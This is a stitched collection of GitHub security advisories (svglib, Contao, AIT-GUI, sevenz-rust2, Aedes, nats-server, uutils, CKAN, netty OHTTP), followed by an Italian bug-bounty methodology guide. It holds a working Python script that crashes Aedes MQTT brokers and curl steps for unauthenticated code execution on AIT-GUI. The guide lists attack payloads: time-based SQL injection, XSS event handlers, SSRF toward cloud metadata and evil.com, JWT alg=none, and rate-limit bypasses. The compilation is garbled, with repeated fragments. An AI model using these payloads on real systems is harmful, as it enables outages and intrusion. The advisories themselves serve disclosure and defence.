levels | SVG size | time | peak RSS | |---|---|---|---| | 3 | 919 B | 0.3 s | 42 MiB | | 4 | 1164 B | 2.9 s | 83 MiB | | 5 | 1409 B | 34 s | 469 MiB | svglib 1.5.1 from PyPI behaves the same (levels = 4: 2.8 s, 82 MiB). Through xhtml2pdf 0.2.23 with the same SVG embedded as a `data:` URI ``: | levels | HTML size | time | peak RSS | |---|---|---|---| | 4 | 1626 B | 6.9 s | 133 MiB | | 5 | 1954 B | 78.7 s | 499 MiB | # Suggested fix Count `` expansions per document and stop expanding beyond a fixed limit: ```diff @@ src/svglib/svglib.py # A sentinel to identify a situation where a node reference a fragment not yet defined. DELAYED = object() +# Upper bound on the number of elements expanded while rendering one document. +# Nested references multiply (a few hundred bytes can expand to millions of +# nodes), so rendering stops expanding elements beyond this limit. +MAX_USE_EXPANSIONS = 10_000 + @@ class SvgRenderer: self._external_svgs: dict[str, ExternalSVG] = {} + self._use_expansions = 0 self.attrConverter.css_rules = CSSMatcher() @@ def renderUse( if group is None: group = Group() + self._use_expansions += 1 + if self._use_expansions > MAX_USE_EXPANSIONS: + if self._use_expansions == MAX_USE_EXPANSIONS + 1: + logger.error( + "Too many expansions (limit is %d), skipping the rest", + MAX_USE_EXPANSIONS, + ) + return group + try: item = self.xlink_href_target(node, group=group) ``` With the fix, a 6-level payload (1654 B, one million expansions without the limit) renders in 1.1 s with 64 MiB peak RSS. The limit value is a suggestion; 10,000 `` elements is far above what normal documents (icon sprites, symbol libraries) need. # Regression test A regression test `TestUseNode::test_use_nested_expansion_is_bounded` in `tests/test_basic.py` renders the 5-level payload and asserts it finishes within 10 seconds. * Without fix: test fails (30.9 s). * With fix: test passes (1.8 s). `python -m pytest tests/test_basic.py tests/test_units.py tests/test_external_references.py tests/test_fonts.py -q` → **190 passed, 4 skipped**. No regressions. I'm happy to share the full patch (including the test), for example as a PR on a temporary private fork of this advisory. # Affected versions `<= 2.3.0` (verified on 2.3.0 and 1.5.1)

titolo: GHSA-h57j-5f5m-789v: contao/core-bundle: Cross-site scripting in the frontend search results
descrizione:
Commit `23e8cca3136a` hardened the search-result title against insert-tag/XSS by setting `$objTemplate->title = StringUtil::specialchars(StringUtil::stripInsertTags($arrResult[$i]['title']))`. But the legacy HTML5 template does not use that `title` variable - it prints the raw `link` variable, which is assigned without escaping.

## Impact

Affected configuration (important): on 5.7.9 the default search template is the Twig `search_default.html.twig`, which does not use the raw `link` variable and auto-escapes - so a default Twig install is not affected. The vulnerable raw echo is in the legacy `search_default.html5` template (still shipped and selectable in 5.7.9, line 8: `<?= $this->link ?>`); exploitation requires that legacy template to be active for the search module (common on sites migrated from earlier Contao / using custom template selection). Where the legacy template is used, the sink is unambiguously raw and `ModuleSearch::compile()` assigns `link` from the entity-decoded indexed title.

A backend page editor can store script that executes for anonymous front-end visitors (and admins) viewing search results, a stored XSS crossing the editor -> anonymous-visitor boundary.

## Credits

This security vulnerability was found by @HDWSec

titolo: GHSA-r9qp-pqx5-8369: contao/core-bundle: Non-admin users can self-grant permissions that implicitly make them administrators
descrizione:
Commit `2b83a60f7763` (5.7.3) hardened the template editor: it added `TemplateEditorModuleVoter` + `CheckTemplateEditorSaveListener` so a non-admin cannot self-grant the `tpl_editor` backend module (editable PHP-capable templates permit server-side code execution). That voter supports only the `modules` field and the literal value `tpl_editor`.

The equally RCE-capable `theme_import` capability lives in a different field - the `themes` checkbox field (tl_user_group.php:98-105 options include `theme_import`; identical on tl_user.php:248-253) - which has no save_callback and no voter. `TemplateEditorModuleVoter` is the only DC voter registered for tl_user_group, and it does not cover the `themes` field. So a delegated user manager can add `theme_import` to their own (or a managed) account.

Live repro (Contao 5.7.9):
1. As admin, create a non-admin backend group with the `user` (or `group`) module (a delegated user manager), and a user in it. Confirm the user cannot access `tpl_editor` (blocked by the 5.7.3 voter).
2. As that non-admin, edit a group/account: add `themes` to the modules field and `theme_import` to the themes field (both accepted - only `tpl_editor` is blocked). Re-authenticate.

## Impact

A delegated user/group manager (a role explicitly not trusted with template/code access) escalates to arbitrary PHP execution on the server, fully compromising the installation. This bypasses the exact protection the 5.7.3 `tpl_editor` fix introduced.

## Credits

This security vulnerability was found by @HDWSec

titolo: GHSA-23w9-4pg3-xwm3: contao/core-bundle: Improper access control in the CSV import wizard
descrizione:
Custom backend module "key" actions are dispatched in `Backend::getBackendModule()` (Backend.php:322-327) after only the module-level `USER_CAN_ACCESS_MODULE` check - no per-record voter runs.

## Impact

A non-admin editor scoped to certain pages/forms can overwrite the tableitems/listitems/options of arbitrary tl_content / tl_form_field records outside their scope, defeating the per-record access control. Integrity IDOR (blind content overwrite; the value written is `serialize()` of a plain string array from the CSV - not object injection).

titolo: GHSA-3r9g-pfhv-3228: contao/newsletter-bundle: Contao newsletter custom actions bypass channel-scoped authorization
descrizione:
Channel access is enforced only by the DataContainer voters (`NewsletterChannelAccessVoter` / `NewsletterRecipientsAccessVoter`, requiring USER_CAN_EDIT_CHANNEL), whose `supportsType()` fires exclusively for Create/Read/Update/DeleteAction subjects dispatched inside DC_Table's create/edit/delete methods. The newsletter custom key-actions are dispatched directly by `Backend::getBackendModule()` (Backend.php:324-327) after only the module-level `USER_CAN_ACCESS_MODULE` check; the DC_Table constructor runs no per-record ReadAction vote for a key-action. `Newsletter.php` contains no `isGranted` / `denyAccess` / `isAdmin` / `hasAccess` calls, and none of the newsletter DCAs have a `checkPermission` onload callback.

## Impact

A channel-scoped newsletter editor can inject recipients into, mass-mail, and in some versions, delete/denylist recipients of channels they are not authorized to edit - defeating the per-channel permission model (integrity + abuse of the mail-sending capability).

## Credits

This security vulnerability was found by @HDWSec

titolo: GHSA-jrjx-9jjw-747m: AIT-GUI route chain allows unauthenticated Python execution in server process
descrizione:
## Summary
A security issue exists where unauthenticated callers can instruct the AIT-GUI server to execute arbitrary Python scripts. The attack vector involves obtaining a session cookie through GET /, followed by a malicious POST /script/run request containing an absolute file path that bypasses the configured script directory restrictions.

### Patches
* 2.5.1

### Impact
This vulnerability allows unauthenticated remote code execution on the AIT-GUI server. Any attacker with network access can execute arbitrary Python code with daemon privileges.

## Details
_Chain:_
1. `POST /tlm/query` writes the user-controlled `fields` value into `fields_in.txt` under the AIT-GUI static directory.
   *  If the supplied `dataDir` has no `.pcap` files, the route returns the expected `400 Bad Request` before deleting that file.
2. `POST /script/run` accepts `scriptPath=../static/fields_in.txt`.
   * AIT-GUI reads that file and runs it as Python.

_Relevant code:_
- `ait/gui/__init__.py:930,935,942-944`: `/tlm/query` writes `fields` to `fields_in.txt`.
- `ait/gui/__init__.py:952-958,978`: the no-PCAP error path aborts before cleanup.
- `ait/gui/__init__.py:1130-1136`: `/script/run` joins `scriptPath` with `ScriptRoot` and only checks that the path exists.
- `ait/gui/__init__.py:1186-1191`: the selected file is read and executed as Python.
- `ait/gui/__init__.py:1105-1108`: nearby `/scripts/load/<name>` has a path containment check, but `/script/run` does not.

### Fix Information
Restricted script execution paths and avoided using static temp files.

## PoC
1. `POST /tlm/query` writes the user-controlled `fields` value into `fields_in.txt` under the AIT-GUI static directory.
   *  If the supplied `dataDir` has no `.pcap` files, the route returns the expected `400 Bad Request` before deleting that file.
```
# Remove file to ensure nothing exists
AIT-GUI % rm <path>/fields_in.txt

# With server started, send POST request to /tlm/query endpoint
AIT-GUI % curl -X POST http://localhost:8080/tlm/query \  -d "dataDir=<path>" \     
  -d "timeField=time" \
  -d "packet=CCSDS_HEADER" \
  -d "fields=field1,field2,field3" \
  -d "startTime=2026-07-01T00:00:00" \
  -d "endTime=2026-07-10T00:00:00" \
  -o query_out.csv
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   925  100   782  100   143  34798   6363 --:--:-- --:--:-- --:--:-- 42045

# AIT-server log verify that PCAP file cannot be found:
2026-07-10T11:46:37.873 | ERROR    | Unable to locate PCAP files for query given data directory <path>

# Verify file is created and not cleaned up
AIT-GUI % cat <path>/fields_in.txt
field1
field2
field3
```
2. `POST /script/run` accepts `scriptPath=../static/fields_in.txt`.
   * AIT-GUI reads that file and runs it as Python.

```
# Generate session cookie
curl -c cookies.txt -v http://localhost:8080/ -o /dev/null

# Execute example script which currently exists in configured scripts.directory in config.yaml
(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % cat config.yaml | grep script
    script:
        directory: ./scripts

(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % ls scripts
example_script.py

# Create exploit script "exploit.py" outside of configured location
(venv) scripts % ls ../exploit.py 
../exploit.py

# Perform request to example_script.py. This script prints 'correct'
(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % curl -X POST http://localhost:8080/script/run -d "scriptPath=example_script.py" -b cookies.txt

# Perform request to exploit.py, which exists outside of configured location. This script prints 'exploited'
(venv) AIT-GUI-ghsa-jrjx-9jjw-747m % curl -X POST http://localhost:8080/script/run -d "scriptPath=../exploit.py" -b cookies.txt  

# Verify in server logs that correct and exploit print
2026-07-10T13:46:41.441 | INFO     | Starting broker...
correct
...
exploited

```

## Additional Notes

- Python code execution in the AIT-GUI server process.
- The demo is localhost only (`127.0.0.1`) and proves the issue against AIT-GUI `2.5.0`. 
- The tested AIT-GUI source binds the web server to `0.0.0.0`, so in a deployment where another host can reach the AIT-GUI HTTP port, this becomes code execution from that network position.
- No login credentials or privileged account were required in the tested flow. The PoC only used the normal `sid` cookie created by `GET /`. In my local demo, the payload ran as my normal user (`uid=1000`), not root.
- [ait_gui_tlm_query_script_run_rce_live_server.py](https://github.com/user-attachments/files/29583858/ait_gui_tlm_query_script_run_rce_live_server.py)
- [ait-gui-tlm-query-script-run-rce.patch](https://github.com/user-attachments/files/29583552/ait-gui-tlm-query-script-run-rce.patch)
- https://github.com/user-attachments/assets/a188aaa3-783a-4bb0-ab9a-6541f939a26a

titolo: GHSA-qh76-45cr-8xrc: sevenz-rust2: decompress builds each output path as dest.join(entry.name()) with no traversal guard, allowing a crafted .7z to write files outside the destination (Zip-Slip)
descrizione:
### Summary

Extracting an attacker-supplied 7z archive can write files outside the destination directory. The 7z header stores each entry's path as a UTF-16 name with nothing constraining it to a relative, in-tree path. The extractor joins that name onto the destination and writes to the result without normalizing it or checking that it stays under the destination root, so an entry named `../../etc/cron.d/x` or an absolute path escapes the target.

### Details

In `src/util/decompress.rs`, `decompress_impl` computes the per-entry destination directly (line 140):

```rust
let dest_path = dest.join(entry.name());
extract_fn(entry, reader, &dest_path)
```

`default_entry_extract_fn` (line 154) then acts on that path:

```rust
let file = File::create(path)
    .map_err(|e| Error::file_open(e, path.to_string_lossy().to_string()))?;
```

There is no normalization, no `dest_path.starts_with(dest)` check, and no symlink-entry handling. `Path::join` discards the base when the joined component is absolute, and `..` components are not collapsed against the base. The convenience entry points (`decompress`, `decompress_file`, `decompress_with_password`, `decompress_file_with_password`) all route through `decompress_impl` with `default_entry_extract_fn`, so the default API is affected.

The trust boundary is the archive bytes. Any caller that extracts an untrusted `.7z` reaches the sink.

### PoC

1. Build a `.7z` whose `FilesInfo` contains an entry named `../../../../tmp/pwned` (or, on Windows, an absolute path such as `C:\Windows\Temp\pwned`).
2. Call `sevenz_rust2::decompress_file("evil.7z", "./out")`.
3. The file is created at the traversed location outside `./out`. Targeting a startup/cron path or a config file turns the write into code execution or persistence.

### Impact

Arbitrary file write outside the intended directory (CWE-22 / CWE-23, the Zip-Slip class). On extraction of an attacker-controlled archive, an entry overwrites files outside the destination — config, cron, autostart, or build artifacts — which can escalate to code execution. Reachable by upload-handling backends, malware-analysis sandboxes, mod/game installers, and CI steps that unpack user-supplied 7z files.

### Suggested remediation

Reject any entry whose name contains a `ParentDir`, `RootDir`, or `Prefix` component, or canonicalize the joined path and verify `starts_with(dest)` before creating it. Apply the guard inside `default_entry_extract_fn` (and `decompress_impl`) so the hardening is the default rather than left to each caller. Reject or explicitly opt-in symlink entries.

## Maintainer response

This issue was patched with ef760b61f3535ac8b93006212aef41bfebc237eb and released as `v0.21.1` to crates.io

Consumers that extract attacker-supplied archives received over a network without user interaction should re-score as AV:N/UI:N (≈8.6).

titolo: GHSA-xxqp-5qx8-gj5q: Aedes has Uncaught Exception and Uncontrolled Resource Consumption
descrizione:
### Summary
A remote Denial of Service (DoS) vulnerability, allows any remote client to cause a complete crash of the Aedes MQTT broker process. This is achieved by sending a specially crafted MQTT message (via PUBLISH or SUBSCRIBE), or by setting a Will message with such a topic, containing a highly recursive topic string (e.g., with thousands of '/' delimiters). The lack of input validation and error handling leads to an uncaught exception in an internal routing library, terminating the entire Node.js application.

### Details
The Aedes broker fails to enforce limits on the depth or structural complexity of MQTT topic strings. When a client publishes to or subscribes to a topic with excessive levels of recursion, the internal routing logic cascading into the qlobber library (via mqemitter) reaches an hard-coded limit within the qlobber._split_words function.

This function throws a hard Error: too many words (found in lib/qlobber.js:604). Crucially, Aedes does not wrap the calls to these internal modules (such as in handlers/subscribe.js or the publishing logic) in try-catch blocks. Consequently, this exception propagates up to the main Node.js event loop as an unhandled exception, causing the entire broker process to crash immediately.

This vulnerability affects all stable versions of Aedes due to the underlying dependency behavior and missing perimetral validation.

Stack Trace from Crash:
```Plaintext

aedes-broker  | 	throw new Error('too many words');
aedes-broker  | 	^
aedes-broker  | 
aedes-broker  | Error: too many words
aedes-broker  |     at Qlobber._split_words (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604:15)
aedes-broker  |     at Qlobber._split (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:624:18)
aedes-broker  |     at Qlobber.add (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:651:43)
aedes-broker  |     at MQEmitter.on (/app/node_modules/mqemitter/mqemitter.js:65:17)

```
The same uncaught exception can be triggered without an explicit PUBLISH/SUBSCRIBE: a client that registers a Will message with a deeply nested topic crashes the broker when the Will is published on ungraceful disconnect, because the Will publish path calls broker.publish directly and bypasses the PUBLISH handler.

### PoC
**Prerequisites**
+ Aedes MQTT Broker running and accessible over the network. For testing and replication, the broker was deployed using the official Docker image via the following command:
```bash
docker run -d --name aedes-broker -p 1883:1883 moscajs/aedes:latest
```
+ Ability to establish an MQTT session (authenticated or unauthenticated, as per the broker's configuration).

**Reproduction Steps**

1. Save the following Python stress testing script (mqtt_crash_poc.py):
```Python
#!/usr/bin/env python3
import argparse
import time
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, reason_code, properties=None):
    if reason_code != 0:
        print(f"[-] Error en la conexión: {reason_code}")

def on_disconnect(client, userdata, disconnect_flags, reason_code, properties=None):
    if reason_code != 0:
        print(f"[*] -> Desconexión detectada (Caída del bróker). Razón: {reason_code}")

def run_exploit(host, port):
    # Escenarios de colapso directo (Casos 1.2, 1.3, 2.2, 2.3)
    payloads = [
            {"type": "PUB_DEEP", "topic": "a/" * 30000 + "target"},
            {"type": "PUB_LIMIT", "topic": "a/" * 32766 + "a/b"},
            {"type": "SUB_WILD", "topic": "+/" * 150 + "#", "pub": "A/" * 150 + "target"},
            {"type": "SUB_DEEP", "topic": "+/" * 10000 + "#", "pub": "A/" * 10000 + "target"}
    ]
        
    for case in payloads:
        print(f"\n[*] Lanzando vector de ataque tipo: {case['type']}")
        client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
        client.on_connect = on_connect
        client.on_disconnect = on_disconnect
            
        try:
            client.connect(host, port, keepalive=60)
            client.loop_start()
            time.sleep(1)
                
            if "PUB" in case['type']:
                client.publish(case['topic'], payload="DoS_Attack", qos=0)
            else:
                client.subscribe(case['topic'], qos=0)
                time.sleep(1)
                client.publish(case['pub'], payload="DoS_Attack", qos=0)
                    
            time.sleep(2)
        except Exception as e:
            print(f"[-] Error durante el envío: {e}")
        finally:
            client.loop_stop()
            client.disconnect()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--direccion", required=True, help="IP del broker")
    parser.add_argument("-p", "--puerto", type=int, default=1883, help="Puerto")
    args = parser.parse_args()
    run_exploit(args.direccion, args.puerto)
```

2. Run the script against the target broker:python3 mqtt_crash_poc.py -d <BROKER_IP> -p 1883
3. Upon execution, the Aedes broker dies instantly on the very first packet (PUB_DEEP). Checking the container logs will reveal the stack trace provided in the Details section, confirming the Error: too many words exception.

### Impact
This is a Remote Denial of Service (DoS) vulnerability. It affects any infrastructure running an unpatched Aedes MQTT Broker. A successful attack terminates the service entirely, disconnecting all legitimate clients (IoT devices, applications, users) and preventing reconnection until the process is manually or automatically restarted, causing severe business and operational interruption.

titolo: GHSA-p3j5-5hrq-p75h: nats-server Leaf node connections bypass Nats-Trace-Dest permission check
descrizione:
### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server supports leafnode connections between servers and message tracing through NATS headers.

### Problem Description

Message trace destination checks were applied to ordinary client connections but not consistently to messages arriving through leafnode connections.

A leafnode operator could cause trace events to be sent to subjects that would not otherwise be permitted and could use trace-only behavior to prevent normal delivery or storage of affected messages.

Trace events can include routing, subscription, account, service import and JetStream metadata. The payload of the original application message is not chosen through the trace event itself.

### Affected Versions

Versions v2.14.2, v2.12.7 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.8.

### Workarounds

Where possible, avoid granting publish paths from less-trusted leaf nodes into subjects for which trace-only behavior would affect delivery guarantees. No other known workarounds are available aside from upgrading to a fixed release.

### References

 * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-p3j5-5hrq-p75h>
 * Credit: Koda Reef

titolo: GHSA-9rv8-9hvg-92mq: chcon: recursive relabel not anchored to traversal dirfd (TOCTOU)
descrizione:
`chcon` resolved recursive targets from `fts_accpath` with a fresh path lookup, so traversal and the SELinux get/set were not bound to traversal directory state. A privileged recursive relabel can be redirected to unintended objects under rename/symlink races. Fix opens targets with `openat` against the traversal cwd fd before the SELinux operation.

**Fixed in 0.10.0** (PR #12566, commit 7cfc74e47ffab452663be6842d788a5164d9688b): recursive relabel resolution is anchored to the traversal dirfd.

---
_Zellic private finding (zellic-ext/coreutils-private PR #120). Reported in the Zellic *uutils coreutils Program Security Assessment* (for Canonical, Jan 2026), audited commit `3a07ffc5a9bd4c283e75afa548ba1f1957bad242`._

titolo: GHSA-xhrc-7f76-vh96:  uu_env incorrectly rejects backslashes within single-quoted strings accepted by GNU env
descrizione:
In `env -S`, GNU keeps backslashes literal inside single quotes (except `\\` and `\'`); uutils errors on sequences like `\a`. This is the backslash-handling issue of the broader `-S`/`--split-string` parsing divergence.
```
env -S"printf %s '\''\\x'\''"   # GNU prints \x ; uutils: invalid sequence '\x' in -S (125)
```

titolo: GHSA-fjjq-8hw5-cf9f: split: TOCTOU output-open allows truncating a swapped file
descrizione:
`split` checks input/output identity by path before opening the output, then opens with truncation, leaving a race window on mutable path components. GNU opens first and compares the opened output inode against the input before truncating. The race can cause `split` to truncate/write a file different from the one validated — including the input file or another file the process can access.

**Fixed in 0.10.0** (PR #12565, commit 58040feb5c66fce588a7ffac299b3a23bd55cd81): the output open path is hardened against TOCTOU target swaps.

---
_Zellic private finding (zellic-ext/coreutils-private PR #119). Reported in the Zellic *uutils coreutils Program Security Assessment* (for Canonical, Jan 2026), audited commit `3a07ffc5a9bd4c283e75afa548ba1f1957bad242`._

titolo: GHSA-6499-jgj4-2wpf: CKAN: Session Fixation in Registration View
descrizione:
## Description

Web user registration form is vulnerable to session fixation if the site is configured with server-side session storage (CKAN uses cookie-based session storage by default). The attacker would need to either set a cookie on the victim's browser or steal the victim's currently valid session. Session identifiers are now regenerated after registration.

## Patches

This vulnerability has been fixed in CKAN 2.10.11, 2.11.6 and 2.12.0

## Workarounds

switch to cookie-based session storage (the default) or disable web user registration by setting `ckan.auth.create_user_via_web` to false (the default)

titolo: GHSA-cg26-4c6j-2x8h: netty-incubator-codec-ohttp: OHTTP codecs retain consumed outer cumulation buffers after completed exchanges
descrizione:
## Summary:

OHttpClientCodec and OHttpServerCodec retain the encrypted outer HttpContent in a handler-level cumulationBuffer. After a valid OHTTP exchange completes, the OHTTP request/response context is destroyed, but the outer cumulationBuffer is not released or reset. It remains referenced by the codec until a later inbound content frame replaces it or the handler is removed/channel is closed.

This can pin attacker-influenced pooled/direct buffer capacity on idle keep-alive channels. Across many long-lived idle connections, this can create availability pressure.

Affected components:

* codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpClientCodec.java
* codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpServerCodec.java
* codec-ohttp/src/main/java/io/netty/incubator/codec/ohttp/OHttpRequestResponseContext.java

## Root cause:

OHttpClientCodec retains inbound content into a handler-level cumulationBuffer. On LastHttpContent, it destroys only the OHttpRequestResponseContextHolder. The cumulationBuffer is released in handlerRemoved(), not immediately after successful exchange completion.

OHttpServerCodec follows the same pattern: it retains inbound content into a handler-level cumulationBuffer, and on completed request/response it destroys the OHttpRequestResponseContext. The outer cumulationBuffer remains owned by the codec and is released only when the handler is removed.

OHttpRequestResponseContext.parse() consumes bytes from the caller-provided outer cumulation buffer, but its destroy() path releases only the inner binary HTTP cumulation, not the codec-level outer cumulationBuffer.

## PoC:

A local test only:

```
codec-ohttp/src/test/java/io/netty/incubator/codec/ohttp/OHttpCumulationBufferRetentionTest.java
```

The test reuses existing OHTTP test helpers and BouncyCastle crypto provider to perform valid completed OHTTP exchanges over EmbeddedChannel pairs. It sends both a small and a large request/response exchange, confirms completion, then reflects the private cumulationBuffer field from both OHttpClientCodec and OHttpServerCodec.

Command:

```
./mvnw -pl codec-ohttp -Dtest=OHttpCumulationBufferRetentionTest -DfailIfNoTests=false test
```

Observed output:

```
small client after completion: refCnt=1 capacity=1064 readerIndex=1064 writerIndex=1064 readableBytes=0
small server after completion: refCnt=1 capacity=1110 readerIndex=1110 writerIndex=1110 readableBytes=0
large client after completion: refCnt=1 capacity=262144 readerIndex=131114 writerIndex=131114 readableBytes=0
large server after completion: refCnt=1 capacity=262144 readerIndex=131160 writerIndex=131160 readableBytes=0
small after close: clientOldRefCnt=0 serverOldRefCnt=0
large after close: clientOldRefCnt=0 serverOldRefCnt=0
Tests run: 1, Failures: 0, Errors: 0, Skipped: 0
BUILD SUCCESS
```

Interpretation:

After completion, both the client and server cumulationBuffer objects have:

* refCnt=1
* readableBytes=0
* large retained capacity for the large exchange
* channel still open/active
* OHTTP context completed/destroyed

After channel close/handler removal, the previously retained buffers are released and their old refCnt values become 0.

## Impact:

A peer can complete a large valid OHTTP request/response and keep the connection open. The codec retains the high-water outer cumulation buffer for the lifetime of the idle keep-alive channel, or until a later inbound content frame replaces it. Across many idle keep-alive channels, this can pin pooled/direct memory and create availability pressure.

This is not unbounded growth per exchange on a single channel. The more precise impact is connection-lifetime retention of the current consumed high-water outer cumulation buffer.

## Suggested fix:

After successful LastHttpContent processing, release and reset the codec-level outer cumulationBuffer once parsing has consumed the complete message and no unread bytes remain.

Care is needed not to release the buffer if unread bytes remain for pipelined data. A safe fix would release/reset the outer cumulationBuffer in the completed-exchange path only when the parse consumed the full outer body.

## Test environment:

* WSL Ubuntu
* Java 11
* Current main branch / 0.0.24.Final-SNAPSHOT
* PoC test used BouncyCastleOHttpCryptoProvider and existing OHttpCodecsTest helpers

Affected version testing:

The issue was reproduced on the following release tags:

* netty-incubator-codec-parent-ohttp-0.0.20.Final
* netty-incubator-codec-parent-ohttp-0.0.21.Final
* netty-incubator-codec-parent-ohttp-0.0.22.Final
* netty-incubator-codec-parent-ohttp-0.0.23.Final

It was also reproduced on main / 0.0.24.Final-SNAPSHOT.

For 0.0.20.Final through 0.0.23.Final, the PoC output consistently showed:

* large client after completion: refCnt=1 capacity=262144 ... readableBytes=0
* large server after completion: refCnt=1 capacity=262144 ... readableBytes=0
* large after close: clientOldRefCnt=0 serverOldRefCnt=0
* BUILD SUCCESS

This confirms that completed exchanges leave the consumed outer cumulation buffer retained until channel/handler close in these versions.

Mappa flusso dati end-to-end
Testa ogni input con fuzzing (boofuzz, radamsa)
Verifica configurazioni di default e credenziali
Documenta ogni anomalia con PoC riproducibile

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su [webapps] pizzafy-1.0 - SQLi
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

Identifica tecnologie con Wappalyzer o whatweb

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

Documenta sempre con screenshot prima/dopo

Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

Usa batch query per rate limit bypass

Testa nested query DoS con depth limiting

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

